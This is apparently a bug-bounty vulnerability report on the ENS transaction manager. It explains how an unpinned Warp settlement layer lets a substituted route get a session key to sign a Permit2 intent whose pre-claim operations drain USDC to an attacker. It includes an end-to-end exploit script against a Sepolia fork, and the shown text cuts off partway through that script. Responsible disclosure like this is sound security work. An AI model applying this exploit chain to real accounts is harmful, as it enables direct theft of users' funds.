# 92413 w a high unpinned warp settlementlayers and dest only 0x03 session policy lead to direct theft of hybrid custody account funds

**Submitted on Sep 9th 2026 at 15:24:42 UTC by @Omisanin0 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92413
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/packages/transaction-manager>
* **Impacts:**
  * Direct theft of user funds
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

The in-scope Warp send never pins `settlementLayers` and never checks that the returned route's `preClaimOps`, settlement layer, or destOps match the reveal calls the Manager built. On the session-signed reveal path there is no wallet prompt. A hostile `POST /intents/route` that replaces the sole element with `fundingMethod=PERMIT2` and `preClaimOps=MockUSDC.transfer(attacker, ...)` is therefore hashed as `PermitBatchWitnessTransferFrom` and signed by the session key. The in-tree SDK patch packs that signature as standalone-HCA mode `0x03` with dest `operationData` only, so the dest allowlist never sees the origin transfer. On a Sepolia Anvil fork, 19\_000\_000 MockUSDC moved from the HCA to the attacker. Pin `settlementLayers: ['INTENT_EXECUTOR']` and refuse to sign if the route does not match the reviewed calls.

## Vulnerability Details

Root: `submitWarpTransaction` omits `settlementLayers` and session-signs the returned `intentOp` with no compare against the reviewed reveal calls. The patched SDK then packs that Permit2 signature as mode `0x03` (dest `operationData` only). Origin `preClaimOps` are signature-bound and not policy-bound. The consume that moves the tokens is the cash-out of that signature, not a separate IntentExecutor bug.

### 1. Reveal is a session-signed Warp with no settlement pin

`submitRevealBatchActor` builds the honest dest batch (`approve` registrar, `register("myname", wallet, ...)`, resolver writes) and hands it to TXM as a `rhinestone-intent`:

```ts
// packages/transaction-manager/src/machines/registration/registration.hca.actors.ts
const request = buildUserPaidRequest({
  from: input.hca,
  chainId,
  calls: toCalls(revealCalls),
})
```

`buildUserPaidRequest` sets `calls` and `feeAsset: 'USDC'`. It does not set a settlement layer.

`submitWarpTransaction` then builds the SDK send. If a session is attached (reveal after commit: session already enabled, no `enableData`), it session-signs with `verifyExecutions: true` and no wallet prompt:

```ts
// packages/transaction-manager/src/actors/warp-transport.actor.ts
const sessionSigners = signer.session
  ? ({
      type: 'experimental_session' as const,
      session: signer.session.session,
      ...(sessionEnableData ? { enableData: sessionEnableData } : {}),
      verifyExecutions: true,
    } satisfies NonNullable<Transaction['signers']>)
  : undefined

const sdkParams = {
  sourceChains: [chain],
  targetChain: chain,
  calls: [...calls],
  sponsored: UNSPONSORED,
  feeAsset: feeAsset ?? DEFAULT_FEE_ASSET,
  tokenRequests: (tokenRequests ?? []) as TokenRequest[] &
    Transaction['tokenRequests'],
  ...(declaredFunds ? { auxiliaryFunds: declaredFunds } : {}),
  ...(sessionSigners ? { signers: sessionSigners } : {}),
} satisfies Transaction
```

There is no `settlementLayers` key. `prepareTransactionAsIntent` therefore POSTs `options.settlementLayers: undefined`. Quote (`prepareTransaction`) and send (`sendTransaction`) are independent POSTs. The budget quote is not rebound onto send's `preClaimOps`.

The PoC drives this actor with a capturing `RhinestoneAccount.sendTransaction`. Captured keys: `calls,feeAsset,signers,sourceChains,sponsored,targetChain,tokenRequests`. No `settlementLayers`. Signers are `{ type: 'experimental_session', verifyExecutions: true }` with `enableData` omitted.

### 2. Hostile `/intents/route`, replace-sole-element

A substituted `/intents/route` is the same class of TM argument substitution the program already lists: wrong target or arguments on a session-signed send. The live POST is not the PoC (third-party testing is out of program rules). The PoC prints the body and then feeds the SDK the `intentOp` that body produces:

* `settlementLayer` any value other than `INTENT_EXECUTOR` (PoC uses `PERMIT2_HOSTILE`)
* `fundingMethod = PERMIT2`
* `arbiter = attacker`
* `idsAndAmounts = [[uint256(MockUSDC), 1]]` (dummy permitted amount, not the steal size)
* `destinationOps` = honest `buildRevealBatch`
* `preClaimOps` = ERC-7579 batch, `vt = 0x0201...` (ERC1271), inner call `MockUSDC.transfer(attacker, 19_000_000)`

Append a Permit2 element next to an honest `INTENT_EXECUTOR` element is a dead path: `getIntentMessages` uses `.some(INTENT_EXECUTOR)` as a whole-array switch and every origin message becomes `SingleChainOps`. The route has to **replace** the sole element.

### 3. Stock `getIntentMessages` vs in-tree 0x03 packer

`getIntentMessages` Permit2-signs when **no** element is `INTENT_EXECUTOR`:

```js
// @rhinestone/sdk dist/src/execution/utils.js
const withPermit2 = intentOp.elements.some((element) =>
  element.mandate.qualifier.settlementContext.fundingMethod === 'PERMIT2')
const withIntentExecutorOps = intentOp.elements.some((element) =>
  element.mandate.qualifier.settlementContext.settlementLayer ===
    'INTENT_EXECUTOR')
for (const element of intentOp.elements) {
  if (withIntentExecutorOps) {
    origin.push(singleChainOps.getTypedData(...))   // ALL elements
  } else if (withPermit2) {
    origin.push(permit2.getTypedData(...))          // PermitBatchWitnessTransferFrom
  } else {
    origin.push(compact.getCompactTypedData(...))
  }
}
```

Once Warp omits the pin, origin primaryType is `PermitBatchWitnessTransferFrom`. `getTargetExecutionSignature` stays `undefined` on that layer (no dest `SingleChainOps`).

The in-tree modification is `patches/@rhinestone%2Fsdk@1.8.0.patch`:

* `signIntentTypedData` on standalone HCA + `experimental_session` + `PermitBatchWitnessTransferFrom` hashes that typed data, session-signs the digest, and calls `packStandaloneHcaPermit2SessionSignature`.
* That packer emits mode **`0x03`** when `enableData` is omitted (reveal). Packed `operationData` is `packIntentOperation(message.mandate.destOps)` only. Origin ops are in the Permit2 mandate digest, not in the policy blob the validator walks.
* Same patch picks `SIG_MODE_ERC1271` for standalone same-chain. The hostile route also sets origin `vt` to ERC1271. Executor SigMode is taken from **signed `preClaimOps`**, which the route controls.

The signed Permit2 message binds `mandate.originOps` and `mandate.destOps` into the digest. Origin is signature-bound. It is not policy-bound. `spender` is `element.arbiter` (the attacker). Dummy `permitted.amount = 1` is never compared to the origin transfer amount. The steal is `transfer(attacker, 19e6)` in `preClaimOps`, not a Permit2 pull of the signed amount.

### 4. Dest policy contrast (stage F vs D)

The 0x03 envelope the patch builds is what the live validator the client pins then checks. Policy runs on packed dest `operationData` only.

`_validatePermit2Destination` requires `recipient == HCA`, `targetChainId == block.chainid`, `tokenOut` in `{Circle, MockUSDC}`, TokenIn/TokenOut **counts** == 1, destOps hash match, reconstructed Permit2 digest == ERC-1271 `hash`. It never compares `idsAndAmounts` / source amount to the origin transfer.

`_checkRegistrationExecutions` then walks **that dest array**. `PAYMENT_TOKEN.transfer` is `ActionNotAllowed` unless the selector is `approve`.

Put the steal in destOps and the session signature is useless. Put the same transfer in `preClaimOps` and this function never sees it.

PoC stage F is the contrast: destOps = the transfer, same consume path, simulate reverts `InvalidSignature()` `0x8baa579f` (executor wrap of dest `ActionNotAllowed`). Stage D is destOps = honest reveal, originOps = transfer: consume succeeds.

### 5. Cash-out of the signed origin batch

Once that origin batch is signed, it is executable on the IntentExecutor the client already talks to. Adding `onlyRouter` there would be a Rhinestone change. The ENS change is not to sign it.

```solidity
function executePreClaimOpsWithPermit2Stub(...) external returns (bytes32 permit2Hash) {
    permit2Stub.nonce.permit2NonceSlot(account).consumeNonce();
    permit2Hash = _permit2Hash(permit2Stub, mandateStub, preClaimOps);
    bytes32 digest = _permit2HashTypedData(permit2Hash);
    require(_isValidSignature(account, LOCKTAG, digest, permit2Hash, preClaimOps, signature), InvalidSignature());
    LibERC7579.executeOps(account, preClaimOps);
}
```

`_isValidSignature` takes SigMode from **preClaimOps**. `SigMode.ERC1271` is `_verifyWithERC1271` only (no `verifyExecution`). ERC-1271 `isValidSignatureWithSender` requires `sender == INTENT_EXECUTOR`. This consume runs on the IntentExecutor proxy, so that check passes. Uniswap Permit2 is not the ERC-1271 sender.

Dest `executeTargetOpsWithPermit2Stub` is `onlyRouter` and shares `permit2NonceSlot`. After origin consume, dest of this intent cannot land `register`. Name stays free. Origin already executed.

The same unpinned send is the later session Warp path; reveal is the PoC because the HCA is already funded.

### 6. What this is not

* Not the documented 7-day unscoped session-key Known Issue (R2-03 / R2-06). Dest policy is the stated permission; origin `preClaimOps` exceeds it. See Known Issues below.
* Not owner-signed wallet Permit2. That path needs leftover Uniswap `allowance(wallet, Permit2)` and a wallet prompt. Session 0x03 cannot produce a wallet Permit2 owner.
* Not extra destOps smuggled past the allowlist. destOps stay the honest reveal.
* Not a dummy Warp fill hash. Theft is the origin ERC-20 transfer.
* Not first-use commit (packer 0x04, HCA empty until dest funding). This is reveal: session already enabled, HCA already funded from the intended commit-leg EIP-2612.
* Append-Permit2 next to `INTENT_EXECUTOR` is dead (`SingleChainOps`). Compact session `signTypedData` throws `'Not supported'` on this validator. `SigMode.EMISSARY_EXECUTION` would policy-check origin; the attacker will not pick it.

### Suggested fix

In `submitWarpTransaction`, set `settlementLayers: ['INTENT_EXECUTOR']` on the SDK send. After the route returns, refuse to session-sign unless `settlementLayer === 'INTENT_EXECUTOR'`, `destinationOps` equals the reviewed `rhinestoneParams.calls`, and `preClaimOps` is empty or equals the locally declared setup/funding ops.

## Impact Details

**Selected impact (Critical): Direct theft of user funds.**

The session key signs hostile origin `MockUSDC.transfer(attacker, 19_000_000)` because Warp did not pin the route. That amount is attacker-chosen up to `balanceOf(HCA)` at reveal. On the live 1y 5-6 character budget that is roughly 20.20 USDC minus the commit-leg `getCostInToken`. The PoC steals 19.00 USDC and leaves 0.30 USDC dust (below `register` rent 8.000021 USDC).

**Also maps, same root:** "Malicious interactions with an already-connected wallet: Modifying transaction arguments or parameters." Send `/intents/route` substitutes settlement layer and originOps. The session key signs without a new wallet prompt (`experimental_session`, `verifyExecutions: true`).

Not leading with "Hijacking or bricking an ENS name during a Manager flow." After-state is `myname` still free: dest register did not land, the unused commitment ages out after `MAX_COMMITMENT_AGE`, the user can retry with a new EIP-2612. That is collateral, not name takeover.

### Before / after (PoC run, Anvil fork of Sepolia)

|                                                           | Before        | After                               |
| --------------------------------------------------------- | ------------- | ----------------------------------- |
| `MockUSDC.balanceOf(HCA)`                                 | 19\_300\_000  | 300\_000                            |
| `MockUSDC.balanceOf(attacker)`                            | 897\_075\_416 | 916\_075\_416 (+19\_000\_000)       |
| `ETHRegistrar.register("myname")`                         | not yet       | still not landed                    |
| IntentExecutor `isPermit2IntentNonceConsumed(nonce, HCA)` | false         | true                                |
| dest `executeTargetOpsWithPermit2Stub` as attacker        | n/a           | reverts `OnlyRouter()` `0x9e41bdd7` |

Observed steal tx (attacker `writeContract` of `executePreClaimOpsWithPermit2Stub`, not the impersonated enable): `0x160ef5f0b8272c9fe6a77896ee77ab4bd80f9887b37c23905ee09db0ea706fc9` (gas 176200). Confirm rerun: `0x11ac3ed9af49421839ceb392ca81b70684134560aa1b25d37c4eae8d58c2b79d` (gas 176220). HCA in that run: `0xd838060d5241322816e240d8e240db79ba78ec06`. Attacker: Anvil #1 `0x70997970C51812dc3A010C7d01b50e0d17dc79C8`.

### Profitability

* Capital: 0. No flash loan. No leftover Permit2 allowance.
* Profit: 19\_000\_000 MockUSDC (19.00 USDC) in this vector; scales with HCA balance on every standalone-HCA reveal.
* Cost: attacker-paid origin consume (\~176k gas). At 20 gwei that is \~0.0035 ETH, net well above 0 at 19 USDC.
* Failed dest fill does not roll back origin.

### Known Issues / exclusions

* Known Issues last updated 2026-08-14. Unpinned Warp `settlementLayers` plus patched 0x03 dest-only packing is not listed.
* Not R2-03 / R2-06. R2-03 is the 7-day unscoped key in browser storage. Standalone 0x03 is dest-allowlisted: `PAYMENT_TOKEN.transfer` is `ActionNotAllowed` as a destOp. Origin `preClaimOps` doing that transfer is authority beyond the stated dest permissions, not "the key is unscoped for 7 days." R2-06 is storage-only revoke.
* Not EXP-4337-002 (chainId stays 11155111). Not EXP-4337-003 (`from` unused; session-signed).
* Not theoretical: Warp omit, patched 0x03 packer, and dest-only policy blob are in tree. The consume is a real tx on a Sepolia fork of the contracts the client is written against.
* Live `POST` to the production orchestrator was not executed (prohibited third-party testing).

## References

* Warp send (no `settlementLayers`, session signers): `packages/transaction-manager/src/actors/warp-transport.actor.ts` (session block \~114-121, `sdkParams` \~147-164)
* Reveal submit: `packages/transaction-manager/src/machines/registration/registration.hca.actors.ts` (`submitRevealBatchActor` \~993-1020, `buildUserPaidRequest` \~501-533)
* In-tree patch: `patches/@rhinestone%2Fsdk@1.8.0.patch` (`signIntentTypedData` Permit2 standalone branch, `packStandaloneHcaPermit2SessionSignature` mode `0x03`, same-chain `SIG_MODE_ERC1271`)
* `getIntentMessages` Permit2 branch: `@rhinestone/sdk` `dist/src/execution/utils.js` \~694-719
* Permit2 typed data: `dist/src/execution/permit2.js` (domain `{name: Permit2, verifyingContract: 0x000000000022D473030F116dDEE9F6B43aC78BA3}`, `spender = element.arbiter`)
* Live validator the client pins: dest-only `_validateFixedPermit2Session` / `_checkRegistrationExecutions` (`PAYMENT_TOKEN.transfer` is `ActionNotAllowed` unless `approve`)
* IntentExecutor the client talks to: `executePreClaimOpsWithPermit2Stub`; dest twin `executeTargetOpsWithPermit2Stub` (`onlyRouter`); same `permit2NonceSlot`
* Live Sepolia (forked): IntentExecutor `0x00000000005ad9ce1f5035fd62ca96cef16adaaf`, validator `0x5f249FCa8bB4949105651146858c347E8BFb0F7E`, HCA impl `0xAA761541620fC1a42bb701a26a9f107A9DF1E904`, MockUSDC `0x768F42455A2D082E23ceeF7d51e5787C82d67a39`
* Orchestrator (do not send live): `POST https://v1.orchestrator.rhinestone.dev/intents/route`
* Runnable PoC: `packages/smart-account/scripts/poc-f648.ts` (full source below)

## Proof of Concept

## Proof of Concept

Anvil fork of Sepolia. Real factory / HCA / validator / MockUSDC / IntentExecutor. In-tree patched `@rhinestone/sdk@1.8.0`. Their Warp actor. Their `getIntentMessages` and `packStandaloneHcaPermit2SessionSignature` (injected via `Module._compile` because the package does not export them). No public Sepolia or mainnet txs. No mockestrator.

```bash
cd src/audit-comp-ens
pnpm exec tsx packages/smart-account/scripts/poc-f648.ts
```

Spawns `anvil --fork-url $SEPOLIA_FORK_URL --chain-id 11155111 --port 8545` if nothing is already on `:8545`. Default fork URL is the dRPC Sepolia endpoint in the script; override with `SEPOLIA_FORK_URL`.

Setup is not the steal. `StandaloneHCAFactory.deploy` with a fresh `userSalt`, `MockUSDC.mint(HCA, 19_300_000)`, and impersonate-HCA `enableSessionWithRefund` are "commit already landed, session live, HCA funded with the intended reveal budget." Impersonation is not the drain. The drain is the attacker's `writeContract` of `executePreClaimOpsWithPermit2Stub`.

| Stage | What it drives                                                                | Pass condition                                                                                                                                                                                                                                                                                                   |
| ----- | ----------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| A     | `submitWarpTransaction`                                                       | captured `sendTransaction` params have no `settlementLayers`; signers = `experimental_session` / `verifyExecutions: true`; `enableData` omitted                                                                                                                                                                  |
| B     | `getIntentMessages`                                                           | replace-sole-element -> `PermitBatchWitnessTransferFrom`; append Permit2 beside `INTENT_EXECUTOR` -> `SingleChainOps` (append dead); `getTargetExecutionSignature` is `undefined`                                                                                                                                |
| C     | patched `packStandaloneHcaPermit2SessionSignature`                            | envelope mode `0x03`. This is the packer `signIntentTypedData` calls on `PermitBatchWitnessTransferFrom` (`utils.js` \~773-784: hash digest, session ECDSA, this packer). Not an owner 65-byte. The PoC does not call `signIntentTypedData` by name because it is not exported; Stage C is those same two steps. |
| F     | same consume, destOps = `transfer` (before steal, so the nonce is still free) | reverts `InvalidSignature()` `0x8baa579f`                                                                                                                                                                                                                                                                        |
| D     | attacker `executePreClaimOpsWithPermit2Stub` on the live proxy                | HCA Mock `19_300_000 -> 300_000`, attacker +`19_000_000`, receipt `status = success`                                                                                                                                                                                                                             |
| E     | dest-kill                                                                     | `isPermit2IntentNonceConsumed = true`; attacker `executeTargetOpsWithPermit2Stub` reverts `OnlyRouter()` `0x9e41bdd7`                                                                                                                                                                                            |

Last full run printed `ALL PASS`. Stage A keys: `calls,feeAsset,signers,sourceChains,sponsored,targetChain,tokenRequests`. Dummy `idsAndAmounts` amount is `1` on purpose.

Still not in this script, on purpose:

* Live `POST` to Rhinestone orchestrator (prohibited).
* Full `account.sendTransaction` against a live quote (same orchestrator). Stage A drives **their Warp actor** with a capturing `sendTransaction`. Stage B drives **their** `getIntentMessages` on the hostile `intentOp` that a compromised route would return.
* Commit-leg EIP-2612. Funding is `mint` on the fork so the steal is isolated. The steal does not depend on how the HCA was funded.

Full script (`packages/smart-account/scripts/poc-f648.ts`):

```typescript
/**
 * F-648 end-to-end PoC.
 *
 * Proves the full chain on an Anvil fork of Sepolia (no public txs, no mockestrator):
 *   A. Warp send omits settlementLayers and session-signs (verifyExecutions: true)
 *   B. SDK getIntentMessages: replace-sole-element Permit2 vs append-INTENT_EXECUTOR
 *   C. Patched packStandaloneHcaPermit2SessionSignature → 0x03
 *   D. Real IntentExecutor.executePreClaimOpsWithPermit2Stub drains HCA MockUSDC
 *   E. Dest-kill: Permit2 nonce consumed; dest stub is onlyRouter
 *   F. Dest policy: same transfer as destOps reverts ActionNotAllowed
 *
 *   cd src/audit-comp-ens
 *   pnpm exec tsx packages/smart-account/scripts/poc-f648.ts
 */

import { spawn as spawnChild, type ChildProcess } from 'node:child_process'
import fs from 'node:fs'
import Module from 'node:module'
import { createRequire } from 'node:module'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import type { RhinestoneAccount, Session } from '@rhinestone/sdk'
import {
  concat,
  createPublicClient,
  createTestClient,
  createWalletClient,
  encodeAbiParameters,
  encodeFunctionData,
  hashStruct,
  hashTypedData,
  http,
  keccak256,
  parseAbi,
  slice,
  type Address,
  type Hash,
  type Hex,
} from 'viem'
import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { submitWarpTransaction } from '../../transaction-manager/src/actors/warp-transport.actor.ts'
import type { RhinestoneSigner } from '../../transaction-manager/src/types/signer.types.ts'
import { buildStandaloneAccountConfig } from '../src/providers/rhinestone/initialize-account.ts'
import {
  DEFAULT_SESSION_VALIDITY_SECONDS,
  getDestinationContracts,
  MAX_REFUND_AMOUNT,
  MAX_REFUND_EXCHANGE_RATE,
  MAX_REFUND_GAS_OVERHEAD,
} from '../src/providers/rhinestone/manifest.ts'
import {
  buildRevealBatch,
  computeResolverAddress,
} from '../src/providers/rhinestone/registration-calls.ts'
import { computeDestinationSessionSalt } from '../src/providers/rhinestone/session.ts'

const require = createRequire(
  join(dirname(fileURLToPath(import.meta.url)), '../package.json'),
)
const sdkRoot = dirname(require.resolve('@rhinestone/sdk')).replace(/\/dist\/src$/, '')

type TypedData = {
  domain: { chainId: number; name?: string; verifyingContract?: string }
  types: Record<string, unknown>
  primaryType: string
  message: Record<string, unknown>
}

function loadPatchedExecutionUtils(): {
  getIntentMessages: (config: unknown, intentOp: unknown) => {
    origin: TypedData[]
    destination: TypedData
  }
  packStandaloneHcaPermit2SessionSignature: (
    config: unknown,
    signers: unknown,
    parameters: TypedData,
    packedSessionSignature: Hex,
  ) => Hex
  getTargetExecutionSignature: (
    config: unknown,
    intentOp: unknown,
    targetChain: unknown,
    signers: unknown,
  ) => Promise<Hex | undefined>
} {
  const filename = join(sdkRoot, 'dist/src/execution/utils.js')
  const src = fs.readFileSync(filename, 'utf8')
  const exported = `${src}
module.exports.getIntentMessages = getIntentMessages;
module.exports.packStandaloneHcaPermit2SessionSignature = packStandaloneHcaPermit2SessionSignature;
`
  const m = new Module(filename)
  m.filename = filename
  m.paths = Module._nodeModulePaths(dirname(filename))
  m._compile(exported, filename)
  return m.exports as ReturnType<typeof loadPatchedExecutionUtils>
}

const patched = loadPatchedExecutionUtils()
const { getPermissionId } = require(
  join(sdkRoot, 'dist/src/modules/validators/smart-sessions.js'),
) as { getPermissionId: (session: Session) => Hex }

const INTENT_EXECUTOR = '0x00000000005ad9ce1f5035fd62ca96cef16adaaf' as Address
const ERC7579_ERC1271_VT =
  '0x0201000000000000000000000000000000000000000000000000000000000000' as Hex
const ACTION_NOT_ALLOWED = '0xde1834f2'
const ONLY_ROUTER = '0x9e41bdd7' // OnlyRouter()

const OWNER_PK =
  '0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a' as const
const ATTACKER_PK =
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d' as const

const factoryAbi = parseAbi([
  'function deploy(address owner, address hcaImplementation, uint256 userSalt) returns (address hca)',
])
const validatorAbi = parseAbi([
  'function enableSessionWithRefund(bytes32 permissionId, address sessionKey, uint48 validUntil, address resolver, address refundToken, uint96 maxRefundExchangeRate, uint48 maxRefundGasOverhead, uint96 maxRefundAmount)',
  'function isPermissionEnabled(address account, bytes32 permissionId) view returns (bool)',
])
const mockUsdcAbi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function balanceOf(address) view returns (uint256)',
  'function transfer(address to, uint256 amount) returns (bool)',
])
const hcaAbi = parseAbi([
  'function owner() view returns (address)',
  'function ownerAndSessionNonce() view returns (address owner, uint96 sessionNonce)',
])
const executorAbi = [
  {
    type: 'function',
    name: 'executePreClaimOpsWithPermit2Stub',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'account', type: 'address' },
      {
        name: 'permit2Stub',
        type: 'tuple',
        components: [
          { name: 'nonce', type: 'uint256' },
          { name: 'expires', type: 'uint256' },
        ],
      },
      {
        name: 'mandateStub',
        type: 'tuple',
        components: [
          { name: 'tokenInHash', type: 'bytes32' },
          { name: 'minGas', type: 'uint128' },
          { name: 'targetAttributesHash', type: 'bytes32' },
          { name: 'destOpsHash', type: 'bytes32' },
          { name: 'qHash', type: 'bytes32' },
        ],
      },
      {
        name: 'preClaimOps',
        type: 'tuple',
        components: [{ name: 'data', type: 'bytes' }],
      },
      { name: 'signature', type: 'bytes' },
    ],
    outputs: [{ name: 'permit2Hash', type: 'bytes32' }],
  },
  {
    type: 'function',
    name: 'executeTargetOpsWithPermit2Stub',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'account', type: 'address' },
      {
        name: 'permit2Stub',
        type: 'tuple',
        components: [
          { name: 'nonce', type: 'uint256' },
          { name: 'expires', type: 'uint256' },
        ],
      },
      {
        name: 'mandateStub',
        type: 'tuple',
        components: [
          { name: 'sponsor', type: 'address' },
          { name: 'arbiter', type: 'address' },
          { name: 'minGas', type: 'uint128' },
          { name: 'notarizedChainId', type: 'uint256' },
          { name: 'preClaimOpsHash', type: 'bytes32' },
          { name: 'tokenInHash', type: 'bytes32' },
          { name: 'qHash', type: 'bytes32' },
          {
            name: 'targetStub',
            type: 'tuple',
            components: [
              { name: 'fillExpiry', type: 'uint256' },
              { name: 'tokenOutHash', type: 'bytes32' },
            ],
          },
        ],
      },
      {
        name: 'targetOps',
        type: 'tuple',
        components: [{ name: 'data', type: 'bytes' }],
      },
      { name: 'signature', type: 'bytes' },
    ],
    outputs: [{ name: 'permit2Hash', type: 'bytes32' }],
  },
  {
    type: 'function',
    name: 'isPermit2IntentNonceConsumed',
    stateMutability: 'view',
    inputs: [
      { name: 'nonce', type: 'uint256' },
      { name: 'account', type: 'address' },
    ],
    outputs: [{ name: 'used', type: 'bool' }],
  },
] as const

const PERMIT2_TYPES = {
  TokenPermissions: [
    { name: 'token', type: 'address' },
    { name: 'amount', type: 'uint256' },
  ],
  Token: [
    { name: 'token', type: 'address' },
    { name: 'amount', type: 'uint256' },
  ],
  Ops: [
    { name: 'to', type: 'address' },
    { name: 'value', type: 'uint256' },
    { name: 'data', type: 'bytes' },
  ],
  Op: [
    { name: 'vt', type: 'bytes32' },
    { name: 'ops', type: 'Ops[]' },
  ],
  Target: [
    { name: 'recipient', type: 'address' },
    { name: 'tokenOut', type: 'Token[]' },
    { name: 'targetChain', type: 'uint256' },
    { name: 'fillExpiry', type: 'uint256' },
  ],
} as const

type Op = {
  vt: Hex
  ops: { to: Address; value: bigint; data: Hex }[]
}

function assert(cond: unknown, msg: string): asserts cond {
  if (!cond) throw new Error(`ASSERT FAIL: ${msg}`)
}

function tokenAsId(token: Address): bigint {
  return BigInt(token)
}

function hashOp(op: Op): Hex {
  return hashStruct({
    types: PERMIT2_TYPES,
    primaryType: 'Op',
    data: { vt: op.vt, ops: op.ops },
  })
}

function encodeExecutorOperation(op: Op): Hex {
  return concat([
    '0x02',
    '0x01',
    encodeAbiParameters(
      [
        {
          type: 'tuple[]',
          components: [
            { name: 'target', type: 'address' },
            { name: 'value', type: 'uint256' },
            { name: 'callData', type: 'bytes' },
          ],
        },
      ],
      [
        op.ops.map((execution) => ({
          target: execution.to,
          value: execution.value,
          callData: execution.data,
        })),
      ],
    ),
  ])
}

function mandateHashes(typedData: TypedData) {
  const permitted = typedData.message.permitted as {
    token: Address
    amount: bigint
  }[]
  const mandate = typedData.message.mandate as {
    target: {
      recipient: Address
      tokenOut: { token: Address; amount: bigint }[]
      targetChain: bigint
      fillExpiry: bigint
    }
    minGas: bigint
    originOps: Op
    destOps: Op
    q: Hex
  }
  return {
    tokenInHash: keccak256(
      concat(
        permitted.map((p) =>
          hashStruct({
            types: PERMIT2_TYPES,
            primaryType: 'TokenPermissions',
            data: p,
          }),
        ),
      ),
    ),
    tokenOutHash: keccak256(
      concat(
        mandate.target.tokenOut.map((t) =>
          hashStruct({
            types: PERMIT2_TYPES,
            primaryType: 'Token',
            data: t,
          }),
        ),
      ),
    ),
    targetAttributesHash: hashStruct({
      types: PERMIT2_TYPES,
      primaryType: 'Target',
      data: mandate.target,
    }),
    destOpsHash: hashOp(mandate.destOps),
    qHash: mandate.q,
    minGas: mandate.minGas,
    mandate,
  }
}

function hostileElement(args: {
  hca: Address
  attacker: Address
  usdc: Address
  originOp: Op
  destOp: Op
  expires: bigint
  settlementLayer: string
}) {
  return {
    chainId: BigInt(sepolia.id),
    arbiter: args.attacker,
    idsAndAmounts: [[tokenAsId(args.usdc), 1n]] as [bigint, bigint][],
    mandate: {
      recipient: args.hca,
      tokenOut: [[tokenAsId(args.usdc), 1n]] as [bigint, bigint][],
      destinationChainId: BigInt(sepolia.id),
      fillDeadline: args.expires,
      minGas: 1n,
      preClaimOps: args.originOp,
      destinationOps: args.destOp,
      qualifier: {
        encodedVal: '0x' as Hex,
        settlementContext: {
          settlementLayer: args.settlementLayer,
          fundingMethod: 'PERMIT2',
        },
      },
    },
  }
}

function intentOp(
  element: ReturnType<typeof hostileElement>,
  nonce: bigint,
  expires: bigint,
  extra?: ReturnType<typeof hostileElement>,
) {
  return {
    nonce,
    expires,
    elements: extra ? [extra, element] : [element],
  }
}

async function waitForRpc(url: string, timeoutMs = 30_000) {
  const start = Date.now()
  while (Date.now() - start < timeoutMs) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'eth_chainId',
          params: [],
        }),
      })
      const json = (await res.json()) as { result?: string }
      if (json.result === '0xaa36a7') return
    } catch {
      /* retry */
    }
    await new Promise((r) => setTimeout(r, 250))
  }
  throw new Error(`Anvil at ${url} did not become ready`)
}

async function ensureAnvil(): Promise<ChildProcess | null> {
  const rpc = process.env.FORK_RPC ?? 'http://127.0.0.1:8545'
  try {
    await waitForRpc(rpc, 1500)
    console.log(`[anvil] already running at ${rpc}`)
    return null
  } catch {
    if (process.env.SKIP_ANVIL === '1') {
      throw new Error(`No Anvil at ${rpc} and SKIP_ANVIL=1`)
    }
  }
  const forkUrl =
    process.env.SEPOLIA_FORK_URL ??
    'https://lb.drpc.live/sepolia/AnmpasF2C0JBqeAEzxVO8aTDnH6wviUR8JD3QmlfqV1j'
  console.log(`[anvil] spawning fork of ${forkUrl}`)
  const child = spawnChild(
    `${process.env.HOME}/.foundry/bin/anvil`,
    [
      '--fork-url',
      forkUrl,
      '--chain-id',
      '11155111',
      '--port',
      '8545',
      '--silent',
    ],
    { stdio: 'ignore' },
  )
  await waitForRpc(rpc)
  console.log(`[anvil] ready pid=${child.pid}`)
  return child
}

function revertSelector(error: unknown): Hex | undefined {
  const err = error as {
    data?: { data?: Hex; errorName?: string }
    cause?: { data?: { data?: Hex }; raw?: Hex }
    walk?: (fn: (e: unknown) => boolean) => { data?: { data?: Hex } }
    shortMessage?: string
    message?: string
  }
  const raw =
    (typeof err.data?.data === 'string' && err.data.data) ||
    (typeof err.cause?.data?.data === 'string' && err.cause.data.data) ||
    (typeof (error as { data?: Hex }).data === 'string' &&
      (error as { data: Hex }).data) ||
    ''
  const msg = `${err.shortMessage ?? ''} ${err.message ?? ''} ${JSON.stringify(err.data ?? {})}`
  const m = /0x[0-9a-fA-F]{8}/.exec(String(raw) + msg)
  return m ? (m[0].toLowerCase() as Hex) : undefined
}

async function main() {
  const spawned = await ensureAnvil()
  const rpc = process.env.FORK_RPC ?? 'http://127.0.0.1:8545'
  const transport = http(rpc)
  const publicClient = createPublicClient({ chain: sepolia, transport })
  const testClient = createTestClient({
    chain: sepolia,
    transport,
    mode: 'anvil',
  })

  const owner = privateKeyToAccount(OWNER_PK)
  const attacker = privateKeyToAccount(ATTACKER_PK)
  const sessionAccount = privateKeyToAccount(generatePrivateKey())
  const ownerWallet = createWalletClient({
    account: owner,
    chain: sepolia,
    transport,
  })
  const attackerWallet = createWalletClient({
    account: attacker,
    chain: sepolia,
    transport,
  })

  const c = getDestinationContracts(sepolia.id)
  const steal = 19_000_000n
  const fund = 19_300_000n
  const nonce = 0x2222n
  const now = BigInt(Math.floor(Date.now() / 1000))
  const expires = now + 3600n
